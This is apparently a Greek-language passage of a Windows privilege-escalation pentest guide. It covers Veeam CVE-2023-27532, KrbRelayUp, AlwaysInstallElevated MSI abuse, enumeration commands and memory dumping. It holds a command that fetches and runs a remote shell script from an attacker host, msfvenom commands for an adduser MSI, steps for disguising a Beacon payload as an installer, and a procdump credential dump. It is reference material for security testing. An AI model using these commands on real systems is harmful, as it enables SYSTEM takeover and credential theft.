Πολλοί enterprise agents εκθέτουν μια επιφάνεια IPC στο localhost και ένα προνομιούχο κανάλι ενημέρωσης. Αν η εγγραφή μπορεί να εξαναγκαστεί να χρησιμοποιήσει server του attacker και το updater εμπιστεύεται ένα κακόβουλο root CA ή έχει αδύναμους ελέγχους υπογραφών, ένας τοπικός χρήστης μπορεί να παραδώσει ένα κακόβουλο MSI, το οποίο εγκαθιστά η υπηρεσία SYSTEM. Δείτε μια γενικευμένη τεχνική (βασισμένη στην αλυσίδα Netskope stAgentSvc – CVE-2025-0309) εδώ:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM μέσω TCP 9401)

Η αρχική περιγραφή ανά έκδοση και η σημείωση αναγνώρισης ήταν:

Το Veeam B&R < `11.0.1.1261` εκθέτει μια υπηρεσία localhost στο **TCP/9401**, η οποία επεξεργάζεται μηνύματα ελεγχόμενα από attacker, επιτρέποντας την εκτέλεση αυθαίρετων εντολών ως **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Αναγνώριση**: επιβεβαιώστε τον listener και την έκδοση, π.χ. με τις εντολές `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Το Veeam Backup & Replication και το Cloud Connect χρησιμοποιούν μια βασική υπηρεσία backup στο **TCP/9401 από προεπιλογή**. Η [συμβουλευτική ανακοίνωση της Veeam](https://www.veeam.com/kb4424) περιγράφει μη εξουσιοδοτημένη αποκάλυψη διαπιστευτηρίων κρυπτογραφημένης βάσης δεδομένων ρυθμίσεων εντός της περιμέτρου του δικτύου backup· ένα ξεχωριστό δημόσιο PoC επιδεικνύει διαδρομή εκτέλεσης εντολών ως **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Η υπηρεσία μπορεί να κάνει bind σε διεύθυνση πέρα από το localhost, οπότε ελέγξτε την πραγματική διεύθυνση και το PID.

- **Αναγνώριση**: επιβεβαιώστε ότι το TCP/9401 αντιστοιχεί στο `Veeam.Backup.Service.exe` και, στη συνέχεια, ελέγξτε το εγκατεστημένο προϊόν και τα metadata των patches. Οι εντολές `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` είναι ενδείξεις, όχι πλήρης έλεγχος για patches.
- **Ελάχιστες διορθωμένες εκδόσεις**: Η Veeam αναφέρει τις **11a build 11.0.1.1261 P20230227** και **12 build 12.0.0.1420 P20230223** ως τις πρώτες διορθωμένες εκδόσεις· οι παλαιότερες εκδόσεις επηρεάζονται. Μια τετραμερής έκδοση αρχείου από μόνη της δεν αρκεί για να διακρίνει ένα μη διορθωμένο βασικό build από ένα μεταγενέστερο patch με τους ίδιους αριθμούς build. Επαληθεύστε το αναγνωριστικό του patch στο [ιστορικό build του προμηθευτή](https://www.veeam.com/kb2680) πριν χαρακτηρίσετε διορθωμένο ένα build στο όριο.
- **Exploit**: τοποθετήστε ένα PoC όπως το `VeeamHax.exe` μαζί με τα απαιτούμενα Veeam DLLs στον ίδιο κατάλογο και, στη συνέχεια, ενεργοποιήστε ένα SYSTEM payload μέσω του τοπικού socket:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Η υπηρεσία εκτελεί την εντολή ως SYSTEM.

Το PoC που παρατίθεται δείχνει εκτέλεση εντολών ως SYSTEM όταν ισχύουν οι πρόσθετες προϋποθέσεις του· η συμβουλευτική ανακοίνωση του προμηθευτή περιγράφει το ζήτημα αποκάλυψης διαπιστευτηρίων.

## KrbRelayUp

Η αρχική περιγραφή του προεπιλεγμένου περιβάλλοντος ήταν:

Υπάρχει ευπάθεια **local privilege escalation** σε περιβάλλοντα Windows **domain** υπό συγκεκριμένες συνθήκες. Αυτές περιλαμβάνουν περιβάλλοντα όπου **δεν επιβάλλεται η υπογραφή LDAP,** οι χρήστες διαθέτουν δικαιώματα αυτοδιαχείρισης που τους επιτρέπουν να ρυθμίζουν το **Resource-Based Constrained Delegation (RBCD)** και οι χρήστες μπορούν να δημιουργούν υπολογιστές στο domain. Είναι σημαντικό να σημειωθεί ότι αυτές οι **προϋποθέσεις** πληρούνται με τις **προεπιλεγμένες ρυθμίσεις**.

Ένα τοπικό Kerberos relay μπορεί να μεταβεί από μια σύνδεση με χαμηλότερα προνόμια σε μια εγγραφή καταλόγου με αυξημένα προνόμια, όταν ένας κατάλληλος COM server πραγματοποιήσει authentication και το relayed principal έχει δικαιώματα στο αντικείμενο-στόχο. Το [KrbRelay](https://github.com/cube0x0/KrbRelay) τεκμηριώνει τόσο τις εγγραφές LDAP RBCD όσο και τις εγγραφές `msDS-KeyCredentialLink` (shadow-credential)· το KrbRelayUp αυτοματοποιεί ορισμένες από αυτές τις διαδρομές. Μια αλυσίδα RBCD απαιτεί τα κατάλληλα δικαιώματα delegation και στο αντικείμενο-στόχο, ενώ μια αλυσίδα shadow-credential απαιτεί δικαιώματα εγγραφής key-credential και KDC που υποστηρίζει τη διαδρομή certificate authentication. Καμία από τις δύο διαδρομές δεν προκύπτει μόνο από τη συμμετοχή στο domain.

Ελέγξτε την πολιτική του πραγματικού DC για [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) και [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), τα ACL του αντικειμένου για την relayed ταυτότητα, καθώς και τα επίπεδα authentication και impersonation της επιλεγμένης κλάσης COM. Ο τύπος σύνδεσης και το πλαίσιο διαπιστευτηρίων του caller έχουν σημασία: μια συνεδρία WinRM μπορεί να συμπεριφέρεται διαφορετικά από μια διαδραστική σύνδεση ή μια σύνδεση με νέα διαπιστευτήρια. Η δρομολόγηση firewall/OXID και οι εγκατεστημένες ενημερώσεις μπορούν επίσης να αλλάξουν το αποτέλεσμα. Αντιμετωπίστε μια επιτρεπτική πολιτική ή ένα ACL που ταιριάζει ως υποψήφιο για έλεγχο· η παθητική απαρίθμηση δεν πρέπει να ενεργοποιεί COM coercion, relay authentication ή εγγραφές στον κατάλογο. Ένα shadow credential λογαριασμού υπολογιστή μπορεί να οδηγήσει σε ticket υπολογιστή και, μόνο αν αυτός ο λογαριασμός διαθέτει τα απαιτούμενα δικαιώματα αναπαραγωγής καταλόγου, σε ξεχωριστή διαδρομή DCSync.

Βρείτε το **exploit στο** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης, ανατρέξτε στο [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Αν** αυτά τα 2 μητρώα είναι **ενεργοποιημένα** (τιμή **0x1**), τότε χρήστες με οποιοδήποτε επίπεδο προνομίων μπορούν να **εγκαταστήσουν** (να εκτελέσουν) αρχεία `*.msi` ως NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Αν έχετε μια συνεδρία meterpreter, μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε στον τρέχοντα κατάλογο ένα Windows MSI binary για κλιμάκωση προνομίων. Αυτό το script δημιουργεί ένα προμεταγλωττισμένο MSI installer που ζητά την προσθήκη χρήστη/ομάδας (οπότε θα χρειαστείτε πρόσβαση GIU):

```
Write-UserAddMSI
```

Απλώς εκτελέστε το δυαδικό αρχείο που δημιουργήθηκε για να κλιμακώσετε τα δικαιώματα.

### MSI Wrapper

Διαβάστε αυτό το tutorial για να μάθετε πώς να δημιουργήσετε ένα MSI wrapper χρησιμοποιώντας αυτά τα tools. Σημειώστε ότι μπορείτε να κάνετε wrap ένα αρχείο "**.bat**" αν θέλετε **απλώς** να **εκτελέσετε** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Δημιουργία MSI με WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Δημιουργία MSI με Visual Studio

- **Δημιουργήστε** με το Cobalt Strike ή το Metasploit ένα **νέο Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Ανοίξτε το **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το project **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε στο project ένα όνομα, όπως **AlwaysPrivesc**, χρησιμοποιήστε το **`C:\privesc`** για τη θέση, επιλέξτε **place solution and project in the same directory** και κάντε κλικ στο **Create**.
- Συνεχίστε να κάνετε κλικ στο **Next** μέχρι να φτάσετε στο βήμα 3 από 4 (επιλογή αρχείων για συμπερίληψη). Κάντε κλικ στο **Add** και επιλέξτε το payload Beacon που μόλις δημιουργήσατε. Έπειτα, κάντε κλικ στο **Finish**.
- Επισημάνετε το project **AlwaysPrivesc** στο **Solution Explorer** και στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
  - Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως τα **Author** και **Manufacturer**, ώστε η εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάντε δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Κάντε δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Κάντε διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και κάντε κλικ στο **OK**. Έτσι διασφαλίζεται ότι το payload Beacon θα εκτελεστεί μόλις εκτελεστεί ο installer.
- Στην ενότητα **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, **κάντε build**.
  - Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### Εγκατάσταση MSI

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου αρχείου `.msi` στο **παρασκήνιο:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Για να εκμεταλλευτείτε αυτήν την ευπάθεια, μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus και Detectors

### Ρυθμίσεις ελέγχου

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, οπότε θα πρέπει να τους δώσετε προσοχή

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Είναι ενδιαφέρον να γνωρίζουμε πού αποστέλλονται τα logs του Windows Event Forwarding.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

Το **LAPS** έχει σχεδιαστεί για τη **διαχείριση των κωδικών πρόσβασης τοπικού Administrator**, διασφαλίζοντας ότι κάθε κωδικός πρόσβασης είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** στους υπολογιστές που είναι συνδεδεμένοι σε domain. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται με ασφάλεια στο Active Directory και είναι προσβάσιμοι μόνο από χρήστες στους οποίους έχουν εκχωρηθεί επαρκή δικαιώματα μέσω ACLs, ώστε να μπορούν να βλέπουν τους κωδικούς πρόσβασης τοπικού admin, εφόσον είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Αν είναι ενεργό, **οι κωδικοί πρόσβασης σε απλό κείμενο αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες για το WDigest σε αυτή τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Από τα **Windows 8.1** και μετά, η Microsoft εισήγαγε ενισχυμένη προστασία για την Αρχή Ασφαλείας Τοπικού Συστήματος (LSA), για να **αποκλείσει** προσπάθειες μη έμπιστων διεργασιών να **διαβάσουν τη μνήμη της** ή να εισαγάγουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες για το LSA Protection εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

Το **Credential Guard** παρουσιάστηκε στα **Windows 10**. Σκοπός του είναι να προστατεύει τα διαπιστευτήρια που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash. [**Περισσότερες πληροφορίες για το Credential Guard είναι διαθέσιμες εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Cached Credentials

Τα **διαπιστευτήρια domain** πιστοποιούνται από το **Local Security Authority** (LSA) και χρησιμοποιούνται από στοιχεία του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη πιστοποιούνται από ένα καταχωρισμένο πακέτο ασφαλείας, συνήθως δημιουργούνται διαπιστευτήρια domain για τον χρήστη.\
[**Περισσότερες πληροφορίες για τα Cached Credentials εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Χρήστες και ομάδες

### Απαρίθμηση χρηστών και ομάδων

Θα πρέπει να ελέγξετε αν κάποια από τις ομάδες στις οποίες ανήκετε διαθέτει ενδιαφέροντα δικαιώματα.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Προνομιούχες ομάδες

Αν **ανήκετε σε κάποια προνομιούχα ομάδα, ίσως μπορείτε να κλιμακώσετε τα προνόμιά σας**. Μάθετε για τις προνομιούχες ομάδες και πώς να τις εκμεταλλευτείτε για να κλιμακώσετε τα προνόμιά σας εδώ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτήν τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την ακόλουθη σελίδα για να **μάθετε για ενδιαφέροντα tokens** και πώς να τα εκμεταλλευτείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Sessions

```bash
qwinsta
klist sessions
```

### Φάκελοι χρηστών

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Πολιτική κωδικών πρόσβασης

```bash
net accounts
```

### Λήψη του περιεχομένου του προχείρου

```bash
powershell -command "Get-Clipboard"
```

## Εκτελούμενες διεργασίες

### Δικαιώματα αρχείων και φακέλων

Πρώτα απ’ όλα, κατά την καταγραφή των διεργασιών **ελέγξτε αν υπάρχουν passwords στη command line της διεργασίας**.\
Ελέγξτε αν μπορείτε να **αντικαταστήσετε κάποιο binary που εκτελείται** ή αν έχετε δικαιώματα εγγραφής στον φάκελο του binary, ώστε να εκμεταλλευτείτε πιθανές [**επιθέσεις DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Να ελέγχετε πάντα αν εκτελούνται [**electron/cef/chromium debuggers**· θα μπορούσατε να τα εκμεταλλευτείτε για escalation προνομίων](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Ένας debugger listener μπορεί να είναι βραχύβιος, επομένως η απουσία του από ένα παθητικό στιγμιότυπο θυρών δεν αποδεικνύει ότι δεν ήταν ποτέ εκτεθειμένος. Συσχετίστε κάθε listener που παρατηρείτε με το PID του, τον ιδιοκτήτη της διεργασίας και τη δυνατότητα του χρήστη με λιγότερα προνόμια να αποκτήσει πρόσβαση σε αυτόν· το όνομα μιας εφαρμογής ή ένα debug flag από μόνο του δεν αποδεικνύει δυνατότητα εκτέλεσης κώδικα μεταξύ χρηστών. Διατηρείτε τη συνήθη απαρίθμηση παθητική, αντί να στέλνετε εντολές debugger.

**Έλεγχος δικαιωμάτων των εκτελέσιμων αρχείων των διεργασιών**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Έλεγχος δικαιωμάτων των φακέλων των δυαδικών αρχείων των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Κατάλογοι dynamic preprocessor του Snort

Το Snort 2 μπορεί να φορτώνει shared libraries από έναν `dynamicpreprocessor directory` που δηλώνεται στο configuration που επιλέγεται με `snort.exe -c <config>`. Για προγραμματισμένη εργασία ή υπηρεσία που εκτελεί το Snort με διαφορετικό account, ελέγξτε το συγκεκριμένο configuration και τα ACL του δηλωμένου καταλόγου modules. Αν το token σας μπορεί να δημιουργήσει αρχεία εκεί, η διαδρομή αξίζει να εξεταστεί ως πιθανό σημείο για code execution την επόμενη φορά που η εργασία ή η υπηρεσία θα φορτώσει modules. Επαληθεύστε τα ενεργά privileges του λογαριασμού εκτέλεσης, το ενεργό configuration, τη συμβατότητα των modules και τυχόν περιορισμούς deny ή share· ένας εγγράψιμος κατάλογος από μόνος του δεν αποδεικνύει privilege escalation. Η [τεκμηρίωση dynamic preprocessor του Snort](https://www.snort.org/documents/dpx-readme) περιγράφει τη φόρτωση modules κατά τον χρόνο εκτέλεσης.

### Προνομιούχα web service με εγγράψιμο document root

Σε μια εγκατάσταση Apache σε Windows, συγκρίνετε τη διαδρομή του εκτελέσιμου αρχείου της υπηρεσίας και τον λογαριασμό εκτέλεσής της με το `DocumentRoot` στο ενεργό `httpd.conf`. Για μια τυπική διάταξη XAMPP, ελέγξτε το `C:\xampp\apache\conf\httpd.conf` και τα ACL του ρυθμισμένου document root, συχνά `C:\xampp\htdocs`. Αν ένας χρήστης με χαμηλότερα privileges μπορεί να δημιουργεί αρχεία σε αυτό το root ενώ το Apache εκτελείται ως `LocalSystem`, η εκτέλεση κώδικα από την πλευρά του server μπορεί να διασχίσει το όριο privileges του host. Επιβεβαιώστε ότι η υπηρεσία εκτελείται, ότι εξυπηρετείται η ακριβής διαδρομή και ότι ένας handler από την πλευρά του server επεξεργάζεται τον συγκεκριμένο τύπο αρχείου· ένα εγγράψιμο root αποδεικνύει από μόνο του μόνο τη δυνατότητα δημιουργίας αρχείων. Ελέγξτε τα ACL χωρίς να γράψετε δοκιμαστικό αρχείο:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Για μια συμβατική εγκατάσταση WAMP, η υπηρεσία μπορεί να δείχνει σε ένα αρχείο `C:\wamp64\bin\apache\apache*\bin\httpd.exe` με έκδοση (ή σε `C:\wamp\...` για διάταξη 32-bit), με τη διαμόρφωση δίπλα του, στη θέση `conf\httpd.conf`, και με προεπιλεγμένο root `C:\wamp64\www` ή `C:\wamp\www`. Ελέγξτε μαζί την ακριβή εικόνα υπηρεσίας, την ταυτότητα εκτέλεσής της, το ενεργό `DocumentRoot` (συμπεριλαμβανομένης της ανάπτυξης του `${INSTALL_DIR}` και των παρακάμψεων virtual host) και το ACL του root. Ένας εγγράψιμος κατάλογος WAMP δεν αποδεικνύει ότι το Apache εκτελείται ως `SYSTEM` ή ότι εκτελεί το υποβληθέν αρχείο. [Η τεκμηρίωση του Apache εξηγεί πώς μια υπηρεσία Windows επιλέγει τη διαμόρφωσή της](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Εγγράψιμο root IIS και ταυτότητα δικτύου application pool

Για το IIS, αντιστοιχίστε έναν εγγράψιμο φυσικό κατάλογο σε έναν **ενεργό ιστότοπο/εφαρμογή** στο `applicationHost.config` και, στη συνέχεια, προσδιορίστε το διαμορφωμένο pool και τον server-side handler του. Ο κώδικας που τοποθετείται σε έναν κατάλογο που εξυπηρετείται από τον server εκτελείται ως το pool μόνο εάν το IIS επεξεργάζεται αυτόν τον τύπο αρχείου και η διαδρομή είναι προσβάσιμη. Πριν θεωρήσετε έναν εγγράψιμο κατάλογο ως δυνατότητα εκτέλεσης κώδικα, ελέγξτε τα δικαιώματα δημιουργίας αρχείων του τρέχοντος χρήστη, την κατάσταση εκτέλεσης του ιστότοπου, τον handler και τις παρακάμψεις ανά διαδρομή.

Η δυναμική μεταγλώττιση ASP.NET εισάγει μια ξεχωριστή διαδρομή που πρέπει να ελεγχθεί: τα αρχεία που δημιουργούνται στον κατάλογο μεταγλώττισης της εφαρμογής. Η προεπιλεγμένη θέση είναι ένας κατάλογος `Temporary ASP.NET Files` κάτω από τη σχετική εγκατάσταση του .NET Framework, αλλά το `<compilation tempDirectory>` της εφαρμογής μπορεί να την αλλάξει. [Η Microsoft τεκμηριώνει τη θέση και τους υποκαταλόγους ανά εφαρμογή](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) και [συνιστά την απομόνωση των καταλόγων μεταγλώττισης όταν τα application pool δεν εμπιστεύονται το ένα το άλλο](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Αν ένα token με χαμηλότερα δικαιώματα μπορεί να τροποποιήσει τον παραγόμενο πηγαίο κώδικα στην **προσωρινή μνήμη της συγκεκριμένης** εφαρμογής, εξακριβώστε αν η εφαρμογή τον μεταγλωττίζει ξανά υπό μια πιο προνομιούχα [ταυτότητα worker process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ένα ACL αρχείου ή καταλόγου από μόνο του δεν αποδεικνύει εκτέλεση κώδικα: συσχετίστε την προσωρινή μνήμη με την ενεργή εφαρμογή, το ενεργό token και το ACL, τις ρυθμίσεις μεταγλώττισης, την ταυτότητα της διεργασίας και τον χρόνο τυχόν επαναμεταγλώττισης. Χρησιμοποιήστε μόνο έλεγχο μεταδεδομένων για ανάγνωση· μην προκαλέσετε μεταγλώττιση και μην τροποποιήσετε αρχεία της προσωρινής μνήμης κατά την απαρίθμηση.

Ένα pool IIS διαμορφωμένο ως `ApplicationPoolIdentity` ή `NetworkService` συνήθως πιστοποιείται σε πόρους του domain ως **λογαριασμός υπολογιστή του host**, παρόλο που το τοπικό του token μπορεί να έχει χαμηλά δικαιώματα. Το `LocalSystem` έχει ήδη υψηλά τοπικά δικαιώματα και χρησιμοποιεί επίσης τον λογαριασμό υπολογιστή στο δίκτυο· το `LocalService` συνήθως χρησιμοποιεί ανώνυμα διαπιστευτήρια δικτύου. Ένα pool `SpecificUser` χρησιμοποιεί τον λογαριασμό που έχει διαμορφωθεί γι’ αυτό. [Η Microsoft τεκμηριώνει αυτούς τους τύπους ταυτότητας](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) και [την ταυτότητα δικτύου του application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Μια ρύθμιση ταυτότητας που παραλείπεται μπορεί να κληρονομήσει τις προεπιλογές του pool, οι οποίες διαφέρουν μεταξύ γενεών IIS, επομένως προσδιορίστε την ενεργή διαμόρφωση αντί να βασιστείτε στο όνομα του pool. Αν η εκτέλεση κώδικα φτάσει σε pool με ταυτότητα δικτύου λογαριασμού υπολογιστή, αξιολογήστε τα δικαιώματα καταλόγου **του συγκεκριμένου υπολογιστή**. Το [DCSync](../active-directory-methodology/dcsync.md) απαιτεί δικαιώματα αναπαραγωγής στο naming context του domain· ένα ticket λογαριασμού μηχανήματος ή ο ρόλος του host από μόνο του δεν αποδεικνύει ότι υπάρχουν αυτά τα δικαιώματα. Η παθητική απαρίθμηση πρέπει να εξετάζει τη διαμόρφωση και τα ACL χωρίς να ανεβάζει αρχεία, να πραγματοποιεί πιστοποίηση δικτύου ή να ζητά tickets.

Για έναν αναγνώσιμο handler ASP.NET που ξεκινά βοηθητική διεργασία, ακολουθήστε οποιαδήποτε τιμή προέρχεται από αίτημα καθώς περνά από την πιστοποίηση, την αποκρυπτογράφηση, την επικύρωση και τη δημιουργία εντολής. Ένας handler που συνενώνει ένα αποκωδικοποιημένο token με το `ProcessStartInfo("cmd", "/c ...")` μπορεί να επιτρέψει σε μεταχαρακτήρες του shell να αλλάξουν την εντολή· [η Microsoft τεκμηριώνει τους ειδικούς χαρακτήρες του `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Εξακριβώστε ότι ένας μη έμπιστος καλών μπορεί πράγματι να επηρεάσει την αποκωδικοποιημένη τιμή και να φτάσει στον handler, και στη συνέχεια προσδιορίστε την ενεργή ταυτότητα του application pool ή την ταυτότητα που προκύπτει από impersonation, καθώς και την ταυτότητα της θυγατρικής διεργασίας. Μια αναγνώσιμη γραμμή πηγαίου κώδικα, ένας listener localhost ή μια αδυναμία στη μορφή του token από μόνα τους δεν αποδεικνύουν εκτέλεση προνομιούχων εντολών. Εξετάστε τον πηγαίο κώδικα και τη διαμόρφωση του pool χωρίς να στείλετε πλαστά αιτήματα ή να εκτελέσετε τη βοηθητική διεργασία κατά την παθητική απαρίθμηση.

Για μια υπηρεσία PHP στα Windows, μια διαδρομή που ελέγχεται από το αίτημα και περνά στις [`include` ή `require`](https://www.php.net/manual/en/function.include.php) μπορεί να εκτελέσει ένα αρχείο PHP εγγράψιμο από χρήστη χαμηλότερων δικαιωμάτων, με την ταυτότητα του worker. Επιβεβαιώστε ότι το αίτημα μπορεί να φτάσει σε αυτήν την εντολή, ότι η επιλυμένη διαδρομή δείχνει σε αρχείο που μπορεί να τροποποιήσει ο χρήστης χαμηλότερων δικαιωμάτων και να διαβάσει ο worker, ότι οι σχετικοί περιορισμοί διαδρομών της PHP επιτρέπουν το include και ότι ο worker εκτελείται πράγματι με υψηλότερα δικαιώματα. Ένας listener loopback ή ένα εγγράψιμο αρχείο από μόνο του δεν αποδεικνύει αυτήν την αλυσίδα· εξετάστε τον πηγαίο κώδικα, την ταυτότητα της υπηρεσίας και τα ACL αρχείων χωρίς να καλέσετε το endpoint κατά την παθητική απαρίθμηση.

### Εξόρυξη κωδικών πρόσβασης από τη μνήμη

Μπορείτε να δημιουργήσετε ένα memory dump μιας διεργασίας που εκτελείται χρησιμοποιώντας το **procdump** από το sysinternals. Υπηρεσίες όπως το FTP έχουν τα **διαπιστευτήρια σε απλό κείμενο στη μνήμη**· δοκιμάστε να κάνετε dump της μνήμης και να διαβάσετε τα διαπιστευτήρια.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Μη ασφαλείς εφαρμογές GUI

**Οι εφαρμογές που εκτελούνται ως SYSTEM ενδέχεται να επιτρέπουν σε έναν χρήστη να ανοίξει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: «Windows Help and Support» (Windows + F1), αναζητήστε «command prompt» και κάντε κλικ στο «Click to open Command Prompt»

### Εισαγωγή αρχείων project με προνόμια

